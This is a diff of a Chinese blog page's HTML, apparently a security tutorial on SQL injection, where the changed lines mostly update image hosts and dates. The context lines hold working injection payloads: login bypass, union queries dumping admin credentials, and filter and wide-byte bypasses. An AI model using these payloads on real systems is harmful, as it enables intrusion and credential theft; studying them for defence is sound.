@@ -27,23 +27,23 @@
 <meta property="og:site_name" content="Yun421">
 <meta property="og:description" content="# SQL注入  产生原理动态交互网站，实现交互利用用户输入拼接到SQL执行，输入不同导致返回结果不同。用户输入内容没有经过完美处理，而且构造SQL语句，直接将构造的SQL语句带入SQL语句中执行，导致SQL注入漏洞。">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041736104.png">
-<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041736105.png">
-<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041736107.png">
-<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041736108.png">
-<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041736109.png">
-<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041736110.png">
-<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041736111.png">
-<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041736112.png">
-<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041736113.png">
-<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041736114.png">
-<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041736115.png">
-<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041736116.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yun0421/picgo/main/img/202203041736104.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yun0421/picgo/main/img/202203041736105.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yun0421/picgo/main/img/202203041736107.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yun0421/picgo/main/img/202203041736108.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yun0421/picgo/main/img/202203041736109.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yun0421/picgo/main/img/202203041736110.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yun0421/picgo/main/img/202203041736111.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yun0421/picgo/main/img/202203041736112.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yun0421/picgo/main/img/202203041736113.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yun0421/picgo/main/img/202203041736114.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yun0421/picgo/main/img/202203041736115.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yun0421/picgo/main/img/202203041736116.png">
 <meta property="article:published_time" content="2021-04-16T13:27:08.000Z">
-<meta property="article:modified_time" content="2022-03-04T09:36:24.817Z">
+<meta property="article:modified_time" content="2022-03-30T05:44:11.967Z">
 <meta property="article:author" content="Yun421">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041736104.png">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/yun0421/picgo/main/img/202203041736104.png">
 
 <link rel="canonical" href="http://yun421.top/2021/04/16/SQL%E6%B3%A8%E5%85%A5/">
 
@@ -215,7 +215,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-03-04 17:36:24" itemprop="dateModified" datetime="2022-03-04T17:36:24+08:00">2022-03-04</time>
+                <time title="修改时间：2022-03-30 13:44:11" itemprop="dateModified" datetime="2022-03-30T13:44:11+08:00">2022-03-30</time>
               </span>
 
           
@@ -238,9 +238,9 @@
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span><span class="keyword">from</span> admin <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;xxx&#x27;</span><span class="operator">+</span><span class="keyword">or</span><span class="operator">+</span><span class="number">1</span> #<span class="string">&#x27;and password = &#x27;</span>password<span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure>
 
 <p>（执行到#前语句结束）</p>
-<p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041736104.png" alt="image-20210406164151516"></p>
+<p><img src="https://raw.githubusercontent.com/yun0421/picgo/main/img/202203041736104.png" alt="image-20210406164151516"></p>
 <h2 id="SQL注入类型分类"><a href="#SQL注入类型分类" class="headerlink" title="SQL注入类型分类"></a>SQL注入类型分类</h2><p>用户输入的数据为<strong>数字、字符</strong>两种。</p>
-<p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041736105.png" alt="image-20210406170058910"></p>
+<p><img src="https://raw.githubusercontent.com/yun0421/picgo/main/img/202203041736105.png" alt="image-20210406170058910"></p>
 <h2 id="SQL注入出现的位置"><a href="#SQL注入出现的位置" class="headerlink" title="SQL注入出现的位置"></a>SQL注入出现的位置</h2><p>存在于用户可控输入范围</p>
 <p>1.URL提交的参数</p>
 <p>2.HTTP请求主体（POST提交的数据）</p>
@@ -258,35 +258,35 @@
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> person <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
 
 <p> #在person表中筛选出id=1的记录</p>
-<p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041736107.png" alt="image-20210406172121060"></p>
+<p><img src="https://raw.githubusercontent.com/yun0421/picgo/main/img/202203041736107.png" alt="image-20210406172121060"></p>
 <p><strong>判断联合查询语句中的字段数时，可以使用order by num。当依次增大num时，如果出现错误，那么该条SQL查询语句的结果字段数就为num-1</strong></p>
-<p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041736108.png" alt="image-20210406172958431"></p>
+<p><img src="https://raw.githubusercontent.com/yun0421/picgo/main/img/202203041736108.png" alt="image-20210406172958431"></p>
 <h4 id="1-执行联合查询"><a href="#1-执行联合查询" class="headerlink" title="1.执行联合查询"></a>1.执行联合查询</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> person <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041736109.png" alt="image-20210406173352068"></p>
+<p><img src="https://raw.githubusercontent.com/yun0421/picgo/main/img/202203041736109.png" alt="image-20210406173352068"></p>
 <h4 id="2-查询数据库名、版本号、用户信息"><a href="#2-查询数据库名、版本号、用户信息" class="headerlink" title="2.查询数据库名、版本号、用户信息"></a>2.查询数据库名、版本号、用户信息</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> person <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database(),version(),<span class="keyword">user</span>();</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041736110.png" alt="image-20210406173406295"></p>
+<p><img src="https://raw.githubusercontent.com/yun0421/picgo/main/img/202203041736110.png" alt="image-20210406173406295"></p>
 <h4 id="3-查询数据表名"><a href="#3-查询数据表名" class="headerlink" title="3.查询数据表名"></a>3.查询数据表名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> person <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">4</span>,<span class="number">5</span>;</span><br></pre></td></tr></table></figure>
 
 <p>或</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> person <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()),<span class="number">4</span>,<span class="number">5</span>;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041736111.png" alt="image-20210406174232613"></p>
+<p><img src="https://raw.githubusercontent.com/yun0421/picgo/main/img/202203041736111.png" alt="image-20210406174232613"></p>
 <h4 id="4-查询字段名"><a href="#4-查询字段名" class="headerlink" title="4.查询字段名"></a>4.查询字段名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> person <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>),<span class="number">4</span>,<span class="number">5</span>;</span><br></pre></td></tr></table></figure>
 
 <p>或</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> person <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="number">0x61646D696E</span>),<span class="number">4</span>,<span class="number">5</span>;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041736112.png" alt="image-20210406174917938"></p>
+<p><img src="https://raw.githubusercontent.com/yun0421/picgo/main/img/202203041736112.png" alt="image-20210406174917938"></p>
 <h4 id="5-查询具体数据"><a href="#5-查询具体数据" class="headerlink" title="5.查询具体数据"></a>5.查询具体数据</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> person <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,concat(username,<span class="number">0x5c</span>,password),<span class="number">4</span>,<span class="number">5</span> <span class="keyword">from</span> admin;</span><br></pre></td></tr></table></figure>
 
 <p>或</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> person <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,concat(username,<span class="number">0x5c</span>,password),<span class="number">4</span>,<span class="number">5</span> <span class="keyword">from</span> admin limit <span class="number">0</span>，<span class="number">2</span>;</span><br></pre></td></tr></table></figure>
 
 <p><strong>0x5c为分隔符</strong></p>
-<p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041736113.png" alt="image-20210406175301521"></p>
-<h5 id="Burpsuite字符型联合注入利用"><a href="#Burpsuite字符型联合注入利用" class="headerlink" title="Burpsuite字符型联合注入利用"></a>Burpsuite字符型联合注入利用</h5><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041736114.png" alt="image-20210406180820320"></p>
+<p><img src="https://raw.githubusercontent.com/yun0421/picgo/main/img/202203041736113.png" alt="image-20210406175301521"></p>
+<h5 id="Burpsuite字符型联合注入利用"><a href="#Burpsuite字符型联合注入利用" class="headerlink" title="Burpsuite字符型联合注入利用"></a>Burpsuite字符型联合注入利用</h5><p><img src="https://raw.githubusercontent.com/yun0421/picgo/main/img/202203041736114.png" alt="image-20210406180820320"></p>
 <p><strong>Mysql中注释符：#、–+ 闭合引号</strong></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> articles <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> articles <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span>        <span class="comment">--+&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> articles <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span>      注入语句                 <span class="comment">--+&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> articles <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span>      注入语句             <span class="keyword">or</span> <span class="string">&#x27;1     &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> articles <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span>      注入语句             <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
 
@@ -358,7 +358,7 @@
 
 
 <h5 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h5><p><strong>在Mysql中，大小写字母含义一致。如果在进行过滤提交的数据过程中，没有对大小写进行区分，那么此时就会造成大小写绕过过滤的情况。</strong></p>
-<p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041736115.png" alt="image-20210406210119840"></p>
+<p><img src="https://raw.githubusercontent.com/yun0421/picgo/main/img/202203041736115.png" alt="image-20210406210119840"></p>
 <p>都只匹配或过滤union，但是没有过滤大写字母，可以使用大小写绕过，如Union</p>
 <h5 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h5><p><strong>使用preg_replace函数过程中，默认情况只进行一次匹配。因此如果匹配到字符替换为空的情况，就可以造成双写绕过。</strong></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = preg_replace(<span class="string">&#x27;/union|sleep|benchmark|floor/i&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>
@@ -374,7 +374,7 @@
 <p>NULL</p>
 <p>或者在php.ini配置文件中开启magic_quotes_gpc选项，此时对数字型注入来说，如果需要进行数据库中数据获取，需要使用十六进制绕过。对于字符型注入来说，需要进行逃逸引号的操作（即宽字节注入）。</p>
 <h5 id="宽字节注入原理与利用"><a href="#宽字节注入原理与利用" class="headerlink" title="宽字节注入原理与利用"></a>宽字节注入原理与利用</h5><p><strong>如果数据库中存储数据使用的编码方式是GBK，那么由于用户输入的内容会进行双字节组合，会导致用户输入的字节与反斜杠结合，从而逃逸引号。</strong></p>
-<p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041736116.png" alt="image-20210406213141234"></p>
+<p><img src="https://raw.githubusercontent.com/yun0421/picgo/main/img/202203041736116.png" alt="image-20210406213141234"></p>
 <p><strong>无法使用联合查询注入利用方式：preg_match(‘/union/i,$sql’)，完全过滤。</strong></p>
 <h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><h4 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h4><p><strong>1.WAF或者过滤函数完全过滤掉union关键字</strong></p>
 <p><strong>2.页面中不再回显具体数据，但是在SQL语句执行成功或失败返回不同的内容</strong></p>
@@ -570,8 +570,8 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2021/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="prev" title="文件上传">
-      <i class="fa fa-chevron-left"></i> 文件上传
+    <a href="/2021/03/10/ctfshow.%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="prev" title="ctfshow.文件上传">
+      <i class="fa fa-chevron-left"></i> ctfshow.文件上传
     </a></div>
       <div class="post-nav-item">
     <a href="/2021/10/16/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="next" title="信息收集">
@@ -658,7 +658,7 @@
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-count">4</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
   </nav>
